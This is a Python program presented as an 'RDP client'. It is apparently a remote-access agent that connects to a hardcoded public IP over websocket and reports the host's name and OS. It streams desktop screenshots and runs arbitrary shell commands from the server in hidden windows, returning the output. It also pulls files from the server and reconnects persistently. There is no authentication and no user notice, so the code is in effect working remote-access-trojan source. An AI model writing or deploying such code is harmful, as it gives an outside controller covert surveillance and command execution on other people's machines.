#!/usr/bin/env python3
import asyncio
import websockets
import json
import base64
import subprocess
import platform
import os
import time
from io import BytesIO
from datetime import datetime
from PIL import Image
import mss

class RDPClient:
    def __init__(self, server_url):
        self.server_url = server_url
        self.client_id = platform.node()
        self.websocket = None
        self.running = False
        self.screenshot_active = False
        self.screenshot_interval = 0.2
        self.download_path = os.getcwd()
        self.command_queue = asyncio.Queue()
        self.file_response_queue = asyncio.Queue()
        self.file_chunks = {}  # Store chunks: {filename: {index: data}}
        self.active_commands = {}  # Track {pid: {command, start_time, process}}
        
        # Connection resilience
        self.connection_attempts = 0
        self.max_reconnect_delay = 60
        
    async def capture_screenshot(self):
        try:
            with mss.mss() as sct:
                monitor = sct.monitors[1]
                screenshot = sct.grab(monitor)
                
                img = Image.frombytes('RGB', screenshot.size, screenshot.rgb)
                img.thumbnail((1280, 720), Image.Resampling.LANCZOS)
                
                buffered = BytesIO()
                img.save(buffered, format="JPEG", quality=40, optimize=True)
                img_str = base64.b64encode(buffered.getvalue()).decode()
                
                return img_str
        except Exception as e:
            print(f"Error capturing screenshot: {e}")
            return None
            
    def get_formatted_time(self):
        """Return formatted time as 'DayName:HH:MM:SS'"""
        now = datetime.now()
        day_name = now.strftime('%A')
        time_str = now.strftime('%H:%M:%S')
        return f"{day_name}:{time_str}"
    
    async def execute_command_isolated(self, command):
        """
        Execute command as isolated subprocess (like watchdog mechanism)
        - Spawn separate process
        - Track PID and logging
        - Wait for completion
        - Return status (success/fail) and output
        """
        timestamp = self.get_formatted_time()
        process = None
        
        try:
            print(f"[{timestamp}] [COMMAND] Launching: {command}")
            
            if platform.system() == 'Windows':
                # Windows: Use cmd.exe with CREATE_NEW_PROCESS_GROUP for isolation
                process = subprocess.Popen(
                    ['cmd.exe', '/c', command],
                    creationflags=subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.CREATE_NO_WINDOW,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.DEVNULL,
                    text=True
                )
            else:
                # Linux: Use bash with new session for isolation
                process = subprocess.Popen(
                    ['/bin/bash', '-c', command],
                    start_new_session=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.DEVNULL,
                    text=True
                )
            
            pid = process.pid
            timestamp = self.get_formatted_time()
            print(f"[{timestamp}] [COMMAND] Process spawned (PID: {pid})")
            
            # Track active command
            self.active_commands[pid] = {
                'command': command,
                'start_time': time.time(),
                'process': process
            }
            
            # Wait for process to complete with timeout
            try:
                stdout, stderr = process.communicate(timeout=30)
                exit_code = process.returncode
                
                # Cleanup from tracking
                if pid in self.active_commands:
                    del self.active_commands[pid]
                
                timestamp = self.get_formatted_time()
                output = stdout if stdout else stderr
                
                if exit_code == 0:
                    print(f"[{timestamp}] [COMMAND] PID {pid} completed (exit code: 0)")
                    return {
                        'status': 'success',
                        'output': output,
                        'pid': pid,
                        'exit_code': exit_code,
                        'command': command
                    }
                else:
                    print(f"[{timestamp}] [COMMAND] PID {pid} failed (exit code: {exit_code})")
                    return {
                        'status': 'failed',
                        'output': output,
                        'pid': pid,
                        'exit_code': exit_code,
                        'command': command
                    }
                    
            except subprocess.TimeoutExpired:
                timestamp = self.get_formatted_time()
                print(f"[{timestamp}] [COMMAND] PID {pid} timeout (30s) - killing...")
                
                # Kill process group on timeout
                if os.name == 'nt':
                    os.system(f'taskkill /PID {pid} /T /F')
                else:
                    import signal
                    os.killpg(os.getpgid(pid), signal.SIGKILL)
                
                process.kill()
                process.wait()
                
                # Cleanup
                if pid in self.active_commands:
                    del self.active_commands[pid]
                
                return {
                    'status': 'timeout',
                    'output': 'Command timeout (30s) - process terminated',
                    'pid': pid,
                    'exit_code': None,
                    'command': command
                }
                
        except Exception as e:
            timestamp = self.get_formatted_time()
            print(f"[{timestamp}] [COMMAND] Error: {str(e)}")
            
            if process and pid in self.active_commands:
                del self.active_commands[pid]
            
            return {
                'status': 'error',
                'output': f"Error: {str(e)}",
                'pid': None,
                'exit_code': None,
                'command': command
            }
    
    async def execute_command(self, command):
        """Wrapper for command execution - handle special commands and delegation"""
        if command.startswith('/download '):
            filename = command.split(' ', 1)[1].strip()
            return await self.download_file(filename)
        
        # Run isolated command in separate thread to avoid blocking
        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(None, lambda: asyncio.run(self.execute_command_isolated(command)))
        return result
    
    async def download_file(self, filename):
        try:
            # Request file metadata
            await self.websocket.send(json.dumps({
                'type': 'request_file',
                'filename': filename
            }))
            
            # Wait for metadata response
            metadata = await asyncio.wait_for(self.file_response_queue.get(), timeout=10)
            
            if not metadata.get('success'):
                error = metadata.get('error', 'Unknown error')
                return f"Download failed: {error}"
            
            total_chunks = metadata['total_chunks']
            file_size = metadata['file_size']
            
            print(f"Downloading {filename} ({file_size} bytes in {total_chunks} chunks)...")
            
            # Initialize chunks storage
            self.file_chunks[filename] = {}
            
            # Request all chunks
            for chunk_index in range(total_chunks):
                await self.websocket.send(json.dumps({
                    'type': 'get_chunk',
                    'filename': filename,
                    'chunk_index': chunk_index
                }))
                
                # Wait for chunk with timeout
                try:
                    chunk = await asyncio.wait_for(
                        self.file_response_queue.get(), 
                        timeout=30
                    )
                    
                    if chunk.get('success'):
                        chunk_data = base64.b64decode(chunk['data'])
                        self.file_chunks[filename][chunk_index] = chunk_data
                        print(f"Downloaded chunk {chunk_index + 1}/{total_chunks}")
                    else:
                        error = chunk.get('error', 'Unknown error')
                        return f"Chunk {chunk_index} download failed: {error}"
                        
                except asyncio.TimeoutError:
                    return f"Timeout waiting for chunk {chunk_index}"
            
            # Reconstruct file from chunks
            os.makedirs(self.download_path, exist_ok=True)
            filepath = os.path.join(self.download_path, filename)
            
            with open(filepath, 'wb') as f:
                for chunk_index in range(total_chunks):
                    if chunk_index in self.file_chunks[filename]:
                        f.write(self.file_chunks[filename][chunk_index])
            
            # Cleanup
            del self.file_chunks[filename]
            
            return f"File downloaded successfully: {filepath}"
            
        except asyncio.TimeoutError:
            return "Download timeout - request metadata from server failed"
        except Exception as e:
            return f"Download error: {str(e)}"
    
    def get_reconnect_delay(self):
        """Calculate exponential backoff delay"""
        delay = min(2 ** self.connection_attempts, self.max_reconnect_delay)
        jitter = delay * 0.1  # Add 10% jitter
        return delay + (jitter * (time.time() % 1))
            
    async def command_processor(self):
        while self.running:
            try:
                command = await self.command_queue.get()
                timestamp = self.get_formatted_time()
                print(f"[{timestamp}] [PROCESSOR] Processing command: {command}")
                
                result = await self.execute_command(command)
                
                # Extract output from result dict or string
                if isinstance(result, dict):
                    output = result.get('output', '')
                    status = result.get('status', 'unknown')
                    pid = result.get('pid', None)
                    exit_code = result.get('exit_code', None)
                    
                    formatted_output = f"[CMD Output]\\nStatus: {status}\\nPID: {pid}\\nExit Code: {exit_code}\\n\\n{output}"
                    
                    timestamp = self.get_formatted_time()
                    print(f"[{timestamp}] [PROCESSOR] Command completed (Status: {status}, PID: {pid})")
                else:
                    formatted_output = result
                
                # Send result back to controller
                if self.websocket:
                    await self.websocket.send(json.dumps({
                        'type': 'command_output',
                        'command': command,
                        'output': formatted_output,
                        'timestamp': datetime.now().isoformat()
                    }))
                
                self.command_queue.task_done()
            except Exception as e:
                timestamp = self.get_formatted_time()
                print(f"[{timestamp}] [PROCESSOR] Error: {str(e)}")
                await asyncio.sleep(0.1)
    
    async def send_screenshot_loop(self):
        while self.running:
            if self.screenshot_active:
                try:
                    screenshot = await self.capture_screenshot()
                    if screenshot and self.websocket:
                        await self.websocket.send(json.dumps({
                            'type': 'screenshot',
                            'image': screenshot,
                            'timestamp': datetime.now().isoformat()
                        }))
                    await asyncio.sleep(self.screenshot_interval)
                except Exception as e:
                    print(f"Error in screenshot loop: {e}")
                    await asyncio.sleep(1)
            else:
                await asyncio.sleep(0.5)
                
    async def handle_commands(self):
        try:
            async for message in self.websocket:
                data = json.loads(message)
                
                if data['type'] == 'start_screenshot':
                    self.screenshot_active = True
                    print("Screenshot streaming started")
                    
                elif data['type'] == 'stop_screenshot':
                    self.screenshot_active = False
                    print("Screenshot streaming stopped")
                    
                elif data['type'] == 'command':
                    command = data['command']
                    timestamp = self.get_formatted_time()
                    print(f"[{timestamp}] [HANDLER] Received command: {command}")
                    if command.strip().lower() == "/exit":
                        print(f"[{timestamp}] [HANDLER] Exit command received. Shutting down client...")
                        self.running = False
                        self.screenshot_active = False
                        await self.websocket.close()
                        os._exit(0)
                    await self.command_queue.put(command)
                    print(f"[{timestamp}] [HANDLER] Command queued for processing")
                    
                elif data['type'] == 'file_metadata' or data['type'] == 'file_chunk':
                    # Handle chunked file transfer
                    await self.file_response_queue.put(data)
                    
                elif data['type'] == 'file_data':
                    # Handle legacy file transfer (backward compatibility)
                    await self.file_response_queue.put(data)

        except websockets.exceptions.ConnectionClosed:
            print("Connection closed by server")
            self.running = False
            raise
            
    async def connect(self):
        try:
            async with websockets.connect(self.server_url) as websocket:
                self.websocket = websocket
                self.running = True
                self.connection_attempts = 0  # Reset attempts on successful connection
                
                await websocket.send(json.dumps({
                    'type': 'register',
                    'client_id': self.client_id,
                    'hostname': platform.node(),
                    'os': platform.system()
                }))
                
                timestamp = self.get_formatted_time()
                print(f"[{timestamp}] [CLIENT] Connected to server as {self.client_id}")
                
                await asyncio.gather(
                    self.send_screenshot_loop(),
                    self.handle_commands(),
                    self.command_processor()
                )
                
        except Exception as e:
            timestamp = self.get_formatted_time()
            print(f"[{timestamp}] [CLIENT] Connection error: {e}")
            self.running = False
            
            # Cleanup active commands on disconnect
            if self.active_commands:
                timestamp = self.get_formatted_time()
                print(f"[{timestamp}] [CLIENT] Cleaning up {len(self.active_commands)} active command(s)...")
                for pid, cmd_info in list(self.active_commands.items()):
                    try:
                        if os.name == 'nt':
                            os.system(f'taskkill /PID {pid} /T /F')
                        else:
                            import signal
                            os.killpg(os.getpgid(pid), signal.SIGKILL)
                    except:
                        pass
                self.active_commands.clear()
            
    async def start(self):
        while True:
            try:
                await self.connect()
            except Exception as e:
                print(f"[DISCONNECT] ✗ Connection closed by server: {e}")
                self.connection_attempts += 1
            
            reconnect_delay = self.get_reconnect_delay()
            print(f"[RECONNECT] Attempt {self.connection_attempts} - Retrying in {reconnect_delay:.2f} seconds...")
            await asyncio.sleep(reconnect_delay)

if __name__ == '__main__':
    """THIS JUST EXMPLE"""
    SERVER_URL = "ws://108.137.15.61:3500"
    
    client = RDPClient(SERVER_URL)
    asyncio.run(client.start())
